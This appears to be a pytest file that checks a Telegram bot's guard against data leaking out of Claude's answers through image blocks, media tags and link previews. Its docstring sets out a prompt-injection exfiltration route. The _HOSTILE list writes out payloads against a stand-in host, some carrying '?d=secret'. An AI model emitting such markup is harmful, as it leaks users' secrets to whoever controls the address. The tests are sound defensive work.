"""Nothing Claude writes may make Telegram's servers fetch an address.

Two routes exist (Bot API docs, "Rich Markdown style" and
``LinkPreviewOptions``): a media block in a rich message, which Telegram
downloads to show, and a link preview, which Telegram builds by fetching
the first URL of a text message. Claude's answer, its prose on the busy
card, agent descriptions and tool arguments reach both as written, so a
prompt injection could carry a secret out in a URL with no tool call.
"""
from __future__ import annotations

import json
import re

import pytest

from aipager.bot import rich_message as rm
from aipager.bot.media_guard import neutralize_media

# A media block in rich Markdown: `![` (inline or reference image), or a
# raw HTML tag Telegram turns into media or a button.
_LIVE_MEDIA = re.compile(
    r"!\[|</?(img|video|audio|source|picture|figure|tg-document|"
    r"tg-collage|tg-slideshow|tg-button|tg-button-row|iframe|embed|object)[\s/>]",
    re.IGNORECASE,
)

_HOSTILE = [
    "![a](https://x/y)",
    "Done.\n\n![](https://x/y?d=secret \"Photo caption\")",
    "![a][ref]\n\n[ref]: https://x/y",
    "![ref]\n\n[ref]: https://x/y",
    "!![a](https://x/y)",
    "![a](<https://x/y>)",
    "![a [b]](https://x/y)",
    "`![a](https://x/y)`",
    "```\n![a](https://x/y)\n```",
    "<div>\n```\n\n![a](https://x/y)\n```",
    "> ![a](https://x/y)",
    "- ![a](https://x/y)",
    "<details><summary>s</summary>\n![a](https://x/y)\n</details>",
    "<tg-collage>\n![](https://x/a.jpg)\n![](https://x/b.mp4)\n</tg-collage>",
    "<img src=\"https://x/y\"/>",
    "<IMG\nsrc=https://x/y>",
    "<figure><video src=\"https://x/v.mp4\"></video></figure>",
    "<audio src=\"https://x/a.mp3\"></audio>",
    "<tg-document src=\"https://x/d.zip\"></tg-document>",
    "<tg-slideshow><img src=\"https://x/p.jpg\"/></tg-slideshow>",
    "<tg-button type=\"web_app\" url=\"https://x\">Open</tg-button>",
    "<tg-button-row><tg-button type=\"url\" url=\"https://x\">x</tg-button></tg-button-row>",
    "![](tg://photo?id=a)",
]


@pytest.mark.parametrize("text", _HOSTILE, ids=[f"hostile-{i}" for i in range(len(_HOSTILE))])
def test_no_media_block_survives(text):
    out = neutralize_media(text)
    assert not _LIVE_MEDIA.search(out), out
    assert neutralize_media(out) == out, "not idempotent"


def test_an_inline_image_becomes_a_plain_link_with_its_alt_text():
    assert neutralize_media("see ![a chart](https://x/y) here") == \
        "see [a chart](https://x/y) here"


def test_an_image_without_alt_text_shows_its_address():
    assert neutralize_media('![](https://x/y "cap")') == "[https://x/y](https://x/y)"


@pytest.mark.parametrize("text", [
    "plain answer",
    "**bold** _it_ [link](https://aipager.run) `code` <u>u</u> <tg-spoiler>s</tg-spoiler>",
    "a < b and c > d, <b>bold</b>, <imgx>, <figures>, < img src=x>",
    "psql <source.sql and cat <object.json",
    "| a | b |\n|---|---|\n| 1 | 2 |",
    "",
], ids=["plain", "formatting", "lt-gt", "redirects", "table", "empty"])
def test_text_without_media_is_untouched(text):
    assert neutralize_media(text) == text


@pytest.mark.parametrize("text", [
    "```\n![a](https://x/y)\n```",
    "~~~~\n![a](https://x/y)\n~~~~",
    "say `![a](https://x/y)` here",
    "say ``a ` ![a](https://x/y)`` here",
], ids=["backtick-fence", "tilde-fence", "code-span", "double-tick-span"])
def test_an_image_inside_code_is_escaped_not_rewritten(text):
    """Inside code an image is code: it keeps its own text, with only the
    escape that keeps it from ever being a media block."""
    out = neutralize_media(text)
    assert "!\\[a](https://x/y)" in out, out
    assert "[a](https://x/y)" not in out.replace("!\\[a](https://x/y)", ""), out


def test_two_backticks_open_no_fence():
    """A fence is three or more backticks; a line of two opens nothing, so
    the image on the next line is prose and is rewritten."""
    assert neutralize_media("``\n![a](https://x/y)") == "``\n[a](https://x/y)"


def test_an_image_after_a_closed_fence_is_rewritten():
    out = neutralize_media("```\ncode\n```\n![a](https://x/y)")
    assert out.endswith("\n[a](https://x/y)"), out


@pytest.mark.parametrize("text", [
    "![a](u) " + "`" * 20000,
    "![a](u) " + " ".join("`" * n for n in range(1, 250)),
    "![a](u" + " " * 30000,
    "![a](u" + " " * 4 + "\"" + "x" * 30000,
    "![" * 16000,
    "![a](" + "x" * 30000,
], ids=["long-tick-run", "many-tick-runs", "long-space", "open-title", "many-starts", "long-url"])
def test_a_hostile_line_is_neutralised_quickly(text):
    """The guard runs on the event loop for every rich send and card edit:
    a line built to make a regex backtrack must not stall the daemon."""
    import time
    t0 = time.perf_counter()
    out = neutralize_media(text)
    assert time.perf_counter() - t0 < 0.5
    assert not _LIVE_MEDIA.search(out)


# ── The two rich payload builders ──────────────────────────────────────────

def _capture(monkeypatch):
    seen: list[tuple[str, dict]] = []

    async def _fake_post(method, payload, **_kw):
        seen.append((method, payload))
        return {"ok": True, "result": {"message_id": 1}}

    monkeypatch.setattr(rm, "_post", _fake_post)
    return seen


def test_send_rich_message_sends_no_media_block(monkeypatch, run_async):
    seen = _capture(monkeypatch)
    run_async(rm.send_rich_message(1, "Answer\n\n![a](https://x/y)"))
    method, payload = seen[0]
    assert method == "sendRichMessage"
    md = payload["rich_message"]["markdown"]
    assert not _LIVE_MEDIA.search(md), md
    assert "[a](https://x/y)" in md


def test_rich_edit_sends_no_media_block(monkeypatch, run_async):
    seen = _capture(monkeypatch)
    run_async(rm.edit_message_text_rich(1, 2, "card <img src='https://x/y'>"))
    method, payload = seen[0]
    assert method == "editMessageText"
    assert not _LIVE_MEDIA.search(payload["rich_message"]["markdown"])


# ── Link previews ──────────────────────────────────────────────────────────

def _built_bot(mk_bot, monkeypatch, posts):
    """The daemon's own bot, from its own builder, with HTTP replaced at
    the last step so the payload PTB would send is what the test sees."""
    builder = mk_bot()._make_builder()
    builder.token("123456:TEST-token")
    app = builder.build()
    ext = app.bot

    async def _do_post(self, endpoint, data, *args, **kwargs):
        posts.append((endpoint, json.loads(json.dumps(
            {k: v for k, v in data.items()}, default=lambda o: o.to_dict()))))
        return {"message_id": 7, "date": 0, "chat": {"id": 1, "type": "private"},
                "text": "x"}

    # On the class: a bot instance's attributes are read-only on some
    # Python/PTB versions (3.13 in CI). monkeypatch restores it after.
    monkeypatch.setattr(type(ext), "_do_post", _do_post)
    return ext


@pytest.mark.parametrize("call", ["send_message", "edit_message_text"])
def test_every_text_message_turns_link_previews_off(call, mk_bot, monkeypatch, run_async):
    posts: list = []
    bot = _built_bot(mk_bot, monkeypatch, posts)
    if call == "send_message":
        run_async(bot.send_message(1, "see https://x/y?d=secret", parse_mode="HTML"))
    else:
        run_async(bot.edit_message_text("see https://x/y", chat_id=1, message_id=2))
    endpoint, data = posts[0]
    assert data.get("link_preview_options") == {"is_disabled": True}, (endpoint, data)


def test_the_daemon_has_one_bot_and_one_rich_payload_builder():
    """The two guards above hold for every send only because every PTB
    call goes through the bot ``_make_builder`` configures, and every rich
    payload is built in ``rich_message``. A second bot, a second builder
    of ``rich_message`` payloads, an explicit preview option (an explicit
    ``None`` turns the default off) or a raw ``sendMessage`` would bypass
    them."""
    from pathlib import Path

    import aipager
    root = Path(aipager.__file__).parent
    found: dict[str, list[str]] = {
        "builder": [], "bot": [], "rich": [], "preview": [], "raw-send": []}
    checks = {
        "builder": r"\bApplicationBuilder\(",
        "bot": r"(?<![\w])(?:Ext)?Bot\(",
        "rich": r"[\"']rich_message[\"']\s*[:\]]|\brich_message\s*=(?!=)",
        "preview": r"\blink_preview_options\b|\bdisable_web_page_preview\b",
        "raw-send": r"method_url\([^)]*[\"']send(?:Message|RichMessage)[\"']",
    }
    for path in sorted(root.rglob("*.py")):
        rel = path.relative_to(root).as_posix()
        src = path.read_text(encoding="utf-8")
        for name, pat in checks.items():
            if re.search(pat, src):
                found[name].append(rel)
    assert found["builder"] == ["bot/lifecycle.py"], found
    assert found["bot"] == [], found
    assert found["rich"] == ["bot/rich_message.py"], found
    assert found["preview"] == ["bot/lifecycle.py"], found
    # The wizard's fixed "linked to this chat" test message: no URL, no
    # text from Claude.
    assert found["raw-send"] == ["wizard/telegram_api.py"], found


# ── Claude's answer, through the daemon's own answer paths ─────────────────

_ANSWER = "Here is the chart.\n\n![chart](https://x/y?d=secret)\n\n<img src=\"https://x/z\"/>"


def _answer_session(bot):
    import time

    from aipager.state import SessionRegistry, Status
    reg = SessionRegistry()
    s = reg.get_or_create("claude-x1")
    s.label = "x1"
    s.status = Status.BUSY
    s.scope_chat_id, s.scope_kind = 4343, "dm"
    s.busy_started_at = time.monotonic() - 5
    bot.registry._sessions[s.name] = s
    return s


def test_a_merged_answer_reaches_telegram_without_a_media_block(
        mk_bot, run_async, monkeypatch):
    seen = _capture(monkeypatch)
    bot = mk_bot()
    s = _answer_session(bot)
    s.busy_msg_id = 55
    assert run_async(bot._send_merged_final(s, _ANSWER)) is True
    md = [p["rich_message"]["markdown"] for _m, p in seen]
    assert md and any("[chart](https://x/y?d=secret)" in t for t in md), md
    assert not any(_LIVE_MEDIA.search(t) for t in md), md


def test_an_interim_answer_reaches_telegram_without_a_media_block(
        mk_bot, run_async, monkeypatch):
    import time
    seen = _capture(monkeypatch)
    bot = mk_bot()
    s = _answer_session(bot)
    s.bg_agent_started("a1", "general-purpose", time.monotonic())
    run_async(bot._deliver_job_interim(s, _ANSWER, time.time()))
    md = [p["rich_message"]["markdown"] for _m, p in seen]
    assert md and any("[chart](https://x/y?d=secret)" in t for t in md), md
    assert not any(_LIVE_MEDIA.search(t) for t in md), md
